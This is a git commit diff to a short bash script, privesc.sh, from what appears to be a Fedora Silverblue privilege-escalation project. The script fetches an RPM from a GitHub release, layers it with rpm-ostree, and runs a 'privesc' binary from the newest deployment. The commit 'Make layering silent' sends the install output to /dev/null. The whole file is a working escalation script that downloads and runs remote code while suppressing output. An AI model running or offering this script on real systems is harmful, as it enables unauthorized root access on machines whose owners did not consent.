78586d02809aab55756f7ed75d661b97c80cc247
rohanssrao <rohanssrao@gmail.com>
2023-11-11 10:24:31 -0500

    Make layering silent

--- privesc.sh
+++ privesc.sh
@@ -1,4 +1,6 @@
 #!/usr/bin/env bash
 
-rpm-ostree install --assumeyes https://github.com/rohanssrao/silverblue-privesc/releases/latest/download/privesc-0.0.1.x86_64.rpm
+rpm_url="https://github.com/rohanssrao/silverblue-privesc/releases/latest/download/privesc-0.0.1.x86_64.rpm"
+echo "Layering $rpm_url..."
+rpm-ostree install --assumeyes "$rpm_url" &> /dev/null
 $(ls -td /ostree/deploy/fedora/deploy/*/ | head -1)/usr/bin/privesc
